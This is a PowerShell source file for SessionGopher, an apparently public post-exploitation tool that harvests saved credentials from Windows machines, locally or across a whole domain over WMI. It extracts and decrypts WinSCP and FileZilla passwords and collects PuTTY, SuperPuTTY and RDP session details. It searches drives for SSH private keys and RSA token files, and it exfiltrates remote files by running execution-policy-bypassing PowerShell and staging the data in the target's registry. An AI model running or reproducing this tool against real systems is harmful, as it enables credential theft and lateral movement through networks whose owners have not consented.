function Invoke-SessionGopher 
{
    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Computername,
        [Parameter(Position= 1 , Mandatory = $False)]
        [String]
        $Credential,
        [Parameter(Position= 2 , Mandatory = $False)]
        [Alias("iL")]
        [String]
        $Inputlist,
        [Parameter(Position = 3, Mandatory = $False)]
        [Switch]
        $AllDomain,
        [Parameter(Position = 4, Mandatory = $False)]
        [Switch]
        $Thorough,
        [Parameter(Position = 5, Mandatory = $False)]
        [Switch]
        $ExcludeDC,
        [Parameter(Position = 6, Mandatory = $False)]
        [Switch]
        [Alias("o")]
        $OutCSV,
        [Parameter(Position=8, Mandatory = $False)]
        [String]
        $OutputDirectory = "$pwd\SessionGopher-" + (Get-Date -Format o | foreach {$_ -replace ":", "."})
    )
  Write-Output '
          o_       
         /  ".   SessionGopher
       ,"  _-"      
     ,"   m m         
  ..+     )      Brandon Arvanaghi
     `m..m       @arvanaghi | arvanaghi.com
  '
  $ErrorActionPreference = "SilentlyContinue"
  $Error.clear()
  if ($OutCSV) {
    Write-Verbose "Creating directory $OutputDirectory."
    New-Item -ItemType Directory $OutputDirectory | Out-Null
    New-Item ($OutputDirectory + "\PuTTY.csv") -Type File | Out-Null
    New-Item ($OutputDirectory + "\SuperPuTTY.csv") -Type File | Out-Null
    New-Item ($OutputDirectory + "\WinSCP.csv") -Type File | Out-Null
    New-Item ($OutputDirectory + "\FileZilla.csv") -Type File | Out-Null
    New-Item ($OutputDirectory + "\RDP.csv") -Type File | Out-Null
    if ($Thorough) {
        New-Item ($OutputDirectory + "\PuTTY ppk Files.csv") -Type File | Out-Null
        New-Item ($OutputDirectory + "\Microsoft rdp Files.csv") -Type File | Out-Null
        New-Item ($OutputDirectory + "\RSA sdtid Files.csv") -Type File | Out-Null
    }
  }
  if ($Credential) {
    $Credentials = Get-Credential -Credential $Credential
  }
  $HKU = 2147483651
  $HKLM = 2147483650
  $PuTTYPathEnding = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $WinSCPPathEnding = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
  $RDPPathEnding = "\SOFTWARE\Microsoft\Terminal Server Client\Servers"
  if ($Inputlist -or $AllDomain -or $ComputerName) {
    $Reader = ""
    if ($AllDomain) {
      Write-Verbose "Getting member computers in the domain."
      $Reader = GetComputersFromActiveDirectory   
    } elseif ($Inputlist) { 
      Write-Verbose "Reading the list of targets."
      $Reader = Get-Content ((Resolve-Path $Inputlist).Path)
    } elseif ($ComputerName) {
      Write-Verbose "Setting target computer as $ComputerName."
      $Reader = $ComputerName
    }
    $optionalCreds = @{}
    if ($Credentials) {
      $optionalCreds['Credential'] = $Credentials
    }
    foreach ($RemoteComputer in $Reader) {
      if ($AllDomain) {
        $RemoteComputer = $RemoteComputer.Properties.name
      }
       if ($RemoteComputer) {
      Write-Output "Digging on" $RemoteComputer"..."
      $SIDS = Invoke-WmiMethod -Class 'StdRegProv' -Name 'EnumKey' -ArgumentList $HKU,'' -ComputerName $RemoteComputer @optionalCreds | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}
      foreach ($SID in $SIDs) {
        $MappedUserName = try { (Split-Path -Leaf (Split-Path -Leaf (GetMappedSID))) } catch {}
        $Source = (($RemoteComputer + "\" + $MappedUserName) -Join "")
        $UserObject = New-Object PSObject
        $ArrayOfPuTTYSessions = New-Object System.Collections.ArrayList
        $ArrayOfSuperPuTTYSessions = New-Object System.Collections.ArrayList
        $ArrayOfRDPSessions = New-Object System.Collections.ArrayList
        $ArrayOfFileZillaSessions = New-Object System.Collections.ArrayList
        $ArrayOfWinSCPSessions = New-Object System.Collections.ArrayList
        $RDPPath = $SID + $RDPPathEnding
        $PuTTYPath = $SID + $PuTTYPathEnding
        $WinSCPPath = $SID + $WinSCPPathEnding
        $SuperPuTTYFilter = "Drive='C:' AND Path='\\Users\\$MappedUserName\\Documents\\SuperPuTTY\\' AND FileName='Sessions' AND Extension='XML'"
        $FileZillaFilter = "Drive='C:' AND Path='\\Users\\$MappedUserName\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"
        $RDPSessions = Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$RDPPath @optionalCreds
        $PuTTYSessions = Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$PuTTYPath @optionalCreds
        $WinSCPSessions = Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$WinSCPPath @optionalCreds
        $SuperPuTTYPath = (Get-WmiObject -Class 'CIM_DataFile' -Filter $SuperPuTTYFilter -ComputerName $RemoteComputer @optionalCreds | Select Name)
        $FileZillaPath = (Get-WmiObject -Class 'CIM_DataFile' -Filter $FileZillaFilter -ComputerName $RemoteComputer @optionalCreds | Select Name)
        if (($WinSCPSessions | Select-Object -ExpandPropert ReturnValue) -eq 0) {
          Write-Verbose "Found saved WinSCP sessions."
          $WinSCPSessions = $WinSCPSessions | Select-Object -ExpandProperty sNames
          foreach ($WinSCPSession in $WinSCPSessions) {
            $WinSCPSessionObject = "" | Select-Object -Property Source,Session,Hostname,Username,Password
            $WinSCPSessionObject.Source = $Source
            $WinSCPSessionObject.Session = $WinSCPSession
            $Location = $WinSCPPath + "\" + $WinSCPSession
            $WinSCPSessionObject.Hostname = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"HostName" @optionalCreds).sValue
            $WinSCPSessionObject.Username = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"UserName" @optionalCreds).sValue
            $WinSCPSessionObject.Password = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"Password" @optionalCreds).sValue
            if ($WinSCPSessionObject.Password) {
              $MasterPassPath = $SID + "\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
              $MasterPassUsed = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $HKU,$MasterPassPath,"UseMasterPassword" @optionalCreds).uValue
              if (!$MasterPassUsed) {
                  $WinSCPSessionObject.Password = (DecryptWinSCPPassword $WinSCPSessionObject.Hostname $WinSCPSessionObject.Username $WinSCPSessionObject.Password)
              } else {
                  $WinSCPSessionObject.Password = "Saved in session, but master password prevents plaintext recovery"
              }
            }
            [void]$ArrayOfWinSCPSessions.Add($WinSCPSessionObject)
          } # For Each WinSCP Session
          if ($ArrayOfWinSCPSessions.count -gt 0) {
            $UserObject | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -Value $ArrayOfWinSCPSessions
            if ($OutCSV) {
              $ArrayOfWinSCPSessions | Select-Object * | Export-CSV -Append -Path ($OutputDirectory + "\WinSCP.csv") -NoTypeInformation
            } else {
              Write-Output "WinSCP Sessions"
              $ArrayOfWinSCPSessions | Select-Object * | Format-List | Out-String
            }
          }
        } # If path to WinSCP exists
        if (($PuTTYSessions | Select-Object -ExpandPropert ReturnValue) -eq 0) {
          Write-Verbose "Found saved PuTTY sessions."
          $PuTTYSessions = $PuTTYSessions | Select-Object -ExpandProperty sNames
          foreach ($PuTTYSession in $PuTTYSessions) {
            $PuTTYSessionObject = "" | Select-Object -Property Source,Session,Hostname
            $Location = $PuTTYPath + "\" + $PuTTYSession
            $PuTTYSessionObject.Source = $Source
            $PuTTYSessionObject.Session = $PuTTYSession
            $PuTTYSessionObject.Hostname = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"HostName" @optionalCreds).sValue
            [void]$ArrayOfPuTTYSessions.Add($PuTTYSessionObject)
          }
          if ($ArrayOfPuTTYSessions.count -gt 0) {
            $UserObject | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -Value $ArrayOfPuTTYSessions
            if ($OutCSV) {
              $ArrayOfPuTTYSessions | Select-Object * | Export-CSV -Append -Path ($OutputDirectory + "\PuTTY.csv") -NoTypeInformation
            } else {
              Write-Output "PuTTY Sessions"
              $ArrayOfPuTTYSessions | Select-Object * | Format-List | Out-String
            }
          }
        } # If PuTTY session exists
        if (($RDPSessions | Select-Object -ExpandPropert ReturnValue) -eq 0) {
          Write-Verbose "Found saved RDP sessions."
          $RDPSessions = $RDPSessions | Select-Object -ExpandProperty sNames
          foreach ($RDPSession in $RDPSessions) {
            $RDPSessionObject = "" | Select-Object -Property Source,Hostname,Username
            $Location = $RDPPath + "\" + $RDPSession
            $RDPSessionObject.Source = $Source
            $RDPSessionObject.Hostname = $RDPSession
            $RDPSessionObject.Username = (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"UserNameHint" @optionalCreds).sValue
            [void]$ArrayOfRDPSessions.Add($RDPSessionObject)
          }
          if ($ArrayOfRDPSessions.count -gt 0) {
            $UserObject | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -Value $ArrayOfRDPSessions
            if ($OutCSV) {
              $ArrayOfRDPSessions | Select-Object * | Export-CSV -Append -Path ($OutputDirectory + "\RDP.csv") -NoTypeInformation
            } else {
              Write-Output "Microsoft RDP Sessions"
              $ArrayOfRDPSessions | Select-Object * | Format-List | Out-String
            }
          }
        } # If RDP sessions exist
        if ($SuperPuTTYPath.Name) {
          Write-Verbose "Found SupePuTTY sessions.xml"
          $File = "C:\Users\$MappedUserName\Documents\SuperPuTTY\Sessions.xml"
          $FileContents = DownloadAndExtractFromRemoteRegistry $File
          [xml]$SuperPuTTYXML = $FileContents
          (ProcessSuperPuTTYFile $SuperPuTTYXML)
        }
        if ($FileZillaPath.Name) {
          Write-Verbose "Found FileZilaa sitemanager.xml"
          $File = "C:\Users\$MappedUserName\AppData\Roaming\FileZilla\sitemanager.xml"
          $FileContents = DownloadAndExtractFromRemoteRegistry $File
          [xml]$FileZillaXML = $FileContents
          (ProcessFileZillaFile $FileZillaXML)
        } # FileZilla
      } # for each SID
      if ($Thorough) {
        Write-Verbose "Running the Thorough tests. Reading files on the target machine. This may take few minutes."
        $ArrayofPPKFiles = New-Object System.Collections.ArrayList
        $ArrayofRDPFiles = New-Object System.Collections.ArrayList
        $ArrayofsdtidFiles = New-Object System.Collections.ArrayList
        $FilePathsFound = (Get-WmiObject -Class 'CIM_DataFile' -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'" -ComputerName $RemoteComputer @optionalCreds | Select Name)
        (ProcessThoroughRemote $FilePathsFound)
      } 
    $ourerror = $error[0]
    if ($ourerror.Exception.Message.Contains("Access is denied.")) {
	  Write-Warning "Access Denied on $RemoteComputer"
	} elseif ($ourerror.Exception.Message.Contains("The RPC server is unavailable.")) {
	  Write-Warning "Cannot connect to $RemoteComputer. Is the host up and accepting RPC connections?"
	} else {
	  Write-Debug "$($ourerror.Exception.Message)"
	}
    }
    }# for each remote computer
  } else { 
    Write-Output "Digging on"(Hostname)"..."
    $UserHives = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}
    foreach($Hive in $UserHives) {
      $UserObject = New-Object PSObject
      $ArrayOfWinSCPSessions = New-Object System.Collections.ArrayList
      $ArrayOfPuTTYSessions = New-Object System.Collections.ArrayList
      $ArrayOfPPKFiles = New-Object System.Collections.ArrayList
      $ArrayOfSuperPuTTYSessions = New-Object System.Collections.ArrayList
      $ArrayOfRDPSessions = New-Object System.Collections.ArrayList
      $ArrayOfRDPFiles = New-Object System.Collections.ArrayList
      $ArrayOfFileZillaSessions = New-Object System.Collections.ArrayList
      $objUser = (GetMappedSID)
      $Source = (Hostname) + "\" + (Split-Path $objUser.Value -Leaf)
      $UserObject | Add-Member -MemberType NoteProperty -Name "Source" -Value $objUser.Value
      $PuTTYPath = Join-Path $Hive.PSPath "\$PuTTYPathEnding"
      $WinSCPPath = Join-Path $Hive.PSPath "\$WinSCPPathEnding"
      $MicrosoftRDPPath = Join-Path $Hive.PSPath "\$RDPPathEnding"
      $FileZillaPath = "C:\Users\" + (Split-Path -Leaf $UserObject."Source") + "\AppData\Roaming\FileZilla\sitemanager.xml"
      $SuperPuTTYPath = "C:\Users\" + (Split-Path -Leaf $UserObject."Source") + "\Documents\SuperPuTTY\Sessions.xml"
      if (Test-Path $FileZillaPath) {
        [xml]$FileZillaXML = Get-Content $FileZillaPath
        (ProcessFileZillaFile $FileZillaXML)
      }
      if (Test-Path $SuperPuTTYPath) {
        [xml]$SuperPuTTYXML = Get-Content $SuperPuTTYPath
        (ProcessSuperPuTTYFile $SuperPuTTYXML)
      }
      if (Test-Path $MicrosoftRDPPath) {
        $AllRDPSessions = Get-ChildItem $MicrosoftRDPPath
        (ProcessRDPLocal $AllRDPSessions)
      } # If (Test-Path MicrosoftRDPPath)
      if (Test-Path $WinSCPPath) {
        $AllWinSCPSessions = Get-ChildItem $WinSCPPath
        (ProcessWinSCPLocal $AllWinSCPSessions)
      } # If (Test-Path WinSCPPath)
      if (Test-Path $PuTTYPath) {
        $AllPuTTYSessions = Get-ChildItem $PuTTYPath
        (ProcessPuTTYLocal $AllPuTTYSessions)
      } # If (Test-Path PuTTYPath)
    } # For each Hive in UserHives
    if ($Thorough) {
      $PPKExtensionFilesINodes = New-Object System.Collections.ArrayList
      $RDPExtensionFilesINodes = New-Object System.Collections.ArrayList
      $sdtidExtensionFilesINodes = New-Object System.Collections.ArrayList
      $AllDrives = Get-PSDrive
      (ProcessThoroughLocal $AllDrives)
      (ProcessPPKFile $PPKExtensionFilesINodes)
      (ProcessRDPFile $RDPExtensionFilesINodes)
      (ProcesssdtidFile $sdtidExtensionFilesINodes)
    } # If Thorough
  } # Else -- run SessionGopher locally
} # Invoke-SessionGopher
function GetMappedSID {
  if ($Inputlist -or $ComputerName -or $AllDomain) {
    $SIDPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$SID"
    $Value = "ProfileImagePath"
    (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM,$SIDPath,$Value @optionalCreds).sValue
  } else {
    $SID = (Split-Path $Hive.Name -Leaf)
    $objSID = New-Object System.Security.Principal.SecurityIdentifier("$SID")
    $objSID.Translate( [System.Security.Principal.NTAccount])
  }
}
function DownloadAndExtractFromRemoteRegistry($File) {
  $fullregistrypath = "HKLM:\Software\Microsoft\DRM"
  $registrydownname = "ReadMe"
  $regpath = "SOFTWARE\Microsoft\DRM"
  Write-Verbose "Reading remote file and writing on remote registry"
  $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
  $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
  $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -ComputerName $RemoteComputer @optionalCreds
  Start-Sleep -s 15
  $remote_reg = ""
  $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM, $regpath, $registrydownname -Computer $RemoteComputer @optionalCreds
  $decoded = [System.Convert]::FromBase64String($remote_reg.sValue)
  $UTF8decoded = [System.Text.Encoding]::UTF8.GetString($decoded) 
  $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $RemoteComputer @optionalCreds
   $UTF8decoded
}
function ProcessThoroughLocal($AllDrives) {
  foreach ($Drive in $AllDrives) {
    if ($Drive.Provider.Name -eq "FileSystem") {
      $Dirs = Get-ChildItem $Drive.Root -Recurse -ErrorAction SilentlyContinue
      foreach ($Dir in $Dirs) {
        Switch ($Dir.Extension) {
          ".ppk" {[void]$PPKExtensionFilesINodes.Add($Dir)}
          ".rdp" {[void]$RDPExtensionFilesINodes.Add($Dir)}
          ".sdtid" {[void]$sdtidExtensionFilesINodes.Add($Dir)}
        }
      }
    }
  }
}
function ProcessThoroughRemote($FilePathsFound) {
  foreach ($FilePath in $FilePathsFound) {
      $ThoroughObject = "" | Select-Object -Property Source,Path
      $ThoroughObject.Source = $RemoteComputer
      $Extension = [IO.Path]::GetExtension($FilePath.Name)
      if ($Extension -eq ".ppk") {
        $ThoroughObject.Path = $FilePath.Name
        [void]$ArrayofPPKFiles.Add($ThoroughObject)
      } elseif ($Extension -eq ".rdp") {
        $ThoroughObject.Path = $FilePath.Name
        [void]$ArrayofRDPFiles.Add($ThoroughObject)
      } elseif ($Extension -eq ".sdtid") {
        $ThoroughObject.Path = $FilePath.Name
        [void]$ArrayofsdtidFiles.Add($ThoroughObject)
      }
  }
  if ($ArrayOfPPKFiles.count -gt 0) {
    $UserObject | Add-Member -MemberType NoteProperty -Name "PPK Files" -Value $ArrayOfRDPFiles
    if ($OutCSV) {
      $ArrayOfPPKFiles | Export-CSV -Append -Path ($OutputDirectory + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $ArrayOfPPKFiles | Format-List | Out-String
    }
  }
  if ($ArrayOfRDPFiles.count -gt 0) {
    $UserObject | Add-Member -MemberType NoteProperty -Name "RDP Files" -Value $ArrayOfRDPFiles
    if ($OutCSV) {
      $ArrayOfRDPFiles | Export-CSV -Append -Path ($OutputDirectory + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $ArrayOfRDPFiles | Format-List | Out-String
    }
  }
  if ($ArrayOfsdtidFiles.count -gt 0) {
    $UserObject | Add-Member -MemberType NoteProperty -Name "sdtid Files" -Value $ArrayOfsdtidFiles
    if ($OutCSV) {
      $ArrayOfsdtidFiles | Export-CSV -Append -Path ($OutputDirectory + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ArrayOfsdtidFiles | Format-List | Out-String
    }
  }
} # ProcessThoroughRemote
function ProcessPuTTYLocal($AllPuTTYSessions) {
  foreach($Session in $AllPuTTYSessions) {
    $PuTTYSessionObject = "" | Select-Object -Property Source,Session,Hostname
    $PuTTYSessionObject.Source = $Source
    $PuTTYSessionObject.Session = (Split-Path $Session -Leaf)
    $PuTTYSessionObject.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $Session) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    [void]$ArrayOfPuTTYSessions.Add($PuTTYSessionObject)
  }
  if ($OutCSV) {
    $ArrayOfPuTTYSessions | Export-CSV -Append -Path ($OutputDirectory + "\PuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "PuTTY Sessions"
    $ArrayOfPuTTYSessions | Format-List | Out-String
  }
  $UserObject | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -Value $ArrayOfPuTTYSessions
} # ProcessPuTTYLocal
function ProcessRDPLocal($AllRDPSessions) {
  foreach($Session in $AllRDPSessions) {
    $PathToRDPSession = "Microsoft.PowerShell.Core\Registry::" + $Session
    $MicrosoftRDPSessionObject = "" | Select-Object -Property Source,Hostname,Username
    $MicrosoftRDPSessionObject.Source = $Source
    $MicrosoftRDPSessionObject.Hostname = (Split-Path $Session -Leaf)
    $MicrosoftRDPSessionObject.Username = ((Get-ItemProperty -Path $PathToRDPSession -Name "UsernameHint" -ErrorAction SilentlyContinue).UsernameHint)
    [void]$ArrayOfRDPSessions.Add($MicrosoftRDPSessionObject)
  } # For each Session in AllRDPSessions
  if ($OutCSV) {
    $ArrayOfRDPSessions | Export-CSV -Append -Path ($OutputDirectory + "\RDP.csv") -NoTypeInformation
  } else {
    Write-Output "Microsoft Remote Desktop (RDP) Sessions"
    $ArrayOfRDPSessions | Format-List | Out-String
  }
  $UserObject | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -Value $ArrayOfRDPSessions
} #ProcessRDPLocal
function ProcessWinSCPLocal($AllWinSCPSessions) {
  foreach($Session in $AllWinSCPSessions) {
    $PathToWinSCPSession = "Microsoft.PowerShell.Core\Registry::" + $Session
    $WinSCPSessionObject = "" | Select-Object -Property Source,Session,Hostname,Username,Password
    $WinSCPSessionObject.Source = $Source
    $WinSCPSessionObject.Session = (Split-Path $Session -Leaf)
    $WinSCPSessionObject.Hostname = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    $WinSCPSessionObject.Username = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Username" -ErrorAction SilentlyContinue).Username)
    $WinSCPSessionObject.Password = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Password" -ErrorAction SilentlyContinue).Password)
    if ($WinSCPSessionObject.Password) {
      $MasterPassUsed = ((Get-ItemProperty -Path (Join-Path $Hive.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword)
      if (!$MasterPassUsed) {
          $WinSCPSessionObject.Password = (DecryptWinSCPPassword $WinSCPSessionObject.Hostname $WinSCPSessionObject.Username $WinSCPSessionObject.Password)
      } else {
          $WinSCPSessionObject.Password = "Saved in session, but master password prevents plaintext recovery"
      }
    }
    [void]$ArrayOfWinSCPSessions.Add($WinSCPSessionObject)
  } # For each Session in AllWinSCPSessions
  if ($OutCSV) {
    $ArrayOfWinSCPSessions | Export-CSV -Append -Path ($OutputDirectory + "\WinSCP.csv") -NoTypeInformation
  } else {
    Write-Output "WinSCP Sessions"
    $ArrayOfWinSCPSessions | Format-List | Out-String
  }
  $UserObject | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -Value $ArrayOfWinSCPSessions
} # ProcessWinSCPLocal
function ProcesssdtidFile($sdtidExtensionFilesINodes) {
  foreach ($Path in $sdtidExtensionFilesINodes.VersionInfo.FileName) {
    $sdtidFileObject = "" | Select-Object -Property "Source","Path"
    $sdtidFileObject."Source" = $Source
    $sdtidFileObject."Path" = $Path
    [void]$ArrayOfsdtidFiles.Add($sdtidFileObject)
  }
  if ($ArrayOfsdtidFiles.count -gt 0) {
    $UserObject | Add-Member -MemberType NoteProperty -Name "sdtid Files" -Value $ArrayOfsdtidFiles
    if ($OutCSV) {
      $ArrayOfsdtidFiles | Select-Object * | Export-CSV -Append -Path ($OutputDirectory + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ArrayOfsdtidFiles | Select-Object * | Format-List | Out-String
    }
  }
} # Process sdtid File
function ProcessRDPFile($RDPExtensionFilesINodes) {
  foreach ($Path in $RDPExtensionFilesINodes.VersionInfo.FileName) {
    $RDPFileObject = "" | Select-Object -Property "Source","Path","Hostname","Gateway","Prompts for Credentials","Administrative Session"
    $RDPFileObject."Source" = (Hostname)
    $RDPFileObject."Path" = $Path 
    $RDPFileObject."Hostname" = try { (Select-String -Path $Path -Pattern "full address:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $RDPFileObject."Gateway" = try { (Select-String -Path $Path -Pattern "gatewayhostname:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $RDPFileObject."Administrative Session" = try { (Select-String -Path $Path -Pattern "administrative session:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $RDPFileObject."Prompts for Credentials" = try { (Select-String -Path $Path -Pattern "prompt for credentials:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    if (!$RDPFileObject."Administrative Session" -or !$RDPFileObject."Administrative Session" -eq 0) {
      $RDPFileObject."Administrative Session" = "Does not connect to admin session on remote host"
    } else {
      $RDPFileObject."Administrative Session" = "Connects to admin session on remote host"
    }
    if (!$RDPFileObject."Prompts for Credentials" -or $RDPFileObject."Prompts for Credentials" -eq 0) {
      $RDPFileObject."Prompts for Credentials" = "No"
    } else {
      $RDPFileObject."Prompts for Credentials" = "Yes"
    }
    [void]$ArrayOfRDPFiles.Add($RDPFileObject)
  }
  if ($ArrayOfRDPFiles.count -gt 0) {
    $UserObject | Add-Member -MemberType NoteProperty -Name "RDP Files" -Value $ArrayOfRDPFiles
    if ($OutCSV) {
      $ArrayOfRDPFiles | Select-Object * | Export-CSV -Append -Path ($OutputDirectory + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $ArrayOfRDPFiles | Select-Object * | Format-List | Out-String
    }
  }
} # Process RDP File
function ProcessPPKFile($PPKExtensionFilesINodes) {
  foreach ($Path in $PPKExtensionFilesINodes.VersionInfo.FileName) {
    $PPKFileObject = "" | Select-Object -Property "Source","Path","Protocol","Comment","Private Key Encryption","Private Key","Private MAC"
    $PPKFileObject."Source" = (Hostname)
    $PPKFileObject."Path" = $Path
    $PPKFileObject."Protocol" = try { (Select-String -Path $Path -Pattern ": (.*)" -Context 0,0).Matches.Groups[1].Value } catch {}
    $PPKFileObject."Private Key Encryption" = try { (Select-String -Path $Path -Pattern "Encryption: (.*)").Matches.Groups[1].Value } catch {}
    $PPKFileObject."Comment" = try { (Select-String -Path $Path -Pattern "Comment: (.*)").Matches.Groups[1].Value } catch {}
    $NumberOfPrivateKeyLines = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)").Matches.Groups[1].Value } catch {}
    $PPKFileObject."Private Key" = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)" -Context 0,$NumberOfPrivateKeyLines).Context.PostContext -Join "" } catch {}
    $PPKFileObject."Private MAC" = try { (Select-String -Path $Path -Pattern "Private-MAC: (.*)").Matches.Groups[1].Value } catch {}
    [void]$ArrayOfPPKFiles.Add($PPKFileObject)
  }
  if ($ArrayOfPPKFiles.count -gt 0) {
    $UserObject | Add-Member -MemberType NoteProperty -Name "PPK Files" -Value $ArrayOfPPKFiles
    if ($OutCSV) {
      $ArrayOfPPKFiles | Select-Object * | Export-CSV -Append -Path ($OutputDirectory + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $ArrayOfPPKFiles | Select-Object * | Format-List | Out-String
    }
  }
} # Process PPK File
function ProcessFileZillaFile($FileZillaXML) {
  foreach($FileZillaSession in $FileZillaXML.SelectNodes('//FileZilla3/Servers/Server')) {
      $FileZillaSessionHash = @{}
      $FileZillaSession.ChildNodes | ForEach-Object {
          $FileZillaSessionHash["Source"] = $Source
          if ($_.InnerText) {
              if ($_.Name -eq "Pass") {
                  $FileZillaSessionHash["Password"] = $_.InnerText
              } else {
                  $FileZillaSessionHash[$_.Name] = $_.InnerText
              }
          }
      }
    [void]$ArrayOfFileZillaSessions.Add((New-Object PSObject -Property $FileZillaSessionHash | Select-Object -Property * -ExcludeProperty "#text",LogonType,Type,BypassProxy,SyncBrowsing,PasvMode,DirectoryComparison,MaximumMultipleConnections,EncodingType,TimezoneOffset,Colour))
  } # ForEach FileZillaSession in FileZillaXML.SelectNodes()
  foreach ($Session in $ArrayOfFileZillaSessions) {
      $Session.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Session.Password))
      if ($Session.Protocol -eq "0") {
        $Session.Protocol = "Use FTP over TLS if available"
      } elseif ($Session.Protocol -eq 1) {
        $Session.Protocol = "Use SFTP"
      } elseif ($Session.Protocol -eq 3) {
        $Session.Protocol = "Require implicit FTP over TLS"
      } elseif ($Session.Protocol -eq 4) {
        $Session.Protocol = "Require explicit FTP over TLS"
      } elseif ($Session.Protocol -eq 6) {
        $Session.Protocol = "Only use plain FTP (insecure)"
      } 
  }
  if ($OutCSV) {
    $ArrayOfFileZillaSessions | Export-CSV -Append -Path ($OutputDirectory + "\FileZilla.csv") -NoTypeInformation
  } else {
    Write-Output "FileZilla Sessions"
    $ArrayOfFileZillaSessions | Format-List | Out-String
  }
  $UserObject | Add-Member -MemberType NoteProperty -Name "FileZilla Sessions" -Value $ArrayOfFileZillaSessions
} # ProcessFileZillaFile
function ProcessSuperPuTTYFile($SuperPuTTYXML) {
  foreach($SuperPuTTYSessions in $SuperPuTTYXML.ArrayOfSessionData.SessionData) {
    foreach ($SuperPuTTYSession in $SuperPuTTYSessions) { 
      if ($SuperPuTTYSession -ne $null) {
        $SuperPuTTYSessionObject = "" | Select-Object -Property "Source","SessionId","SessionName","Host","Username","ExtraArgs","Port","Putty Session"
        $SuperPuTTYSessionObject."Source" = $Source
        $SuperPuTTYSessionObject."SessionId" = $SuperPuTTYSession.SessionId
        $SuperPuTTYSessionObject."SessionName" = $SuperPuTTYSession.SessionName
        $SuperPuTTYSessionObject."Host" = $SuperPuTTYSession.Host
        $SuperPuTTYSessionObject."Username" = $SuperPuTTYSession.Username
        $SuperPuTTYSessionObject."ExtraArgs" = $SuperPuTTYSession.ExtraArgs
        $SuperPuTTYSessionObject."Port" = $SuperPuTTYSession.Port
        $SuperPuTTYSessionObject."PuTTY Session" = $SuperPuTTYSession.PuttySession
        [void]$ArrayOfSuperPuTTYSessions.Add($SuperPuTTYSessionObject)
      } 
    }
  } # ForEach SuperPuTTYSessions
  if ($OutCSV) {
    $ArrayOfSuperPuTTYSessions | Export-CSV -Append -Path ($OutputDirectory + "\SuperPuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "SuperPuTTY Sessions"
    $ArrayOfSuperPuTTYSessions | Out-String
  }
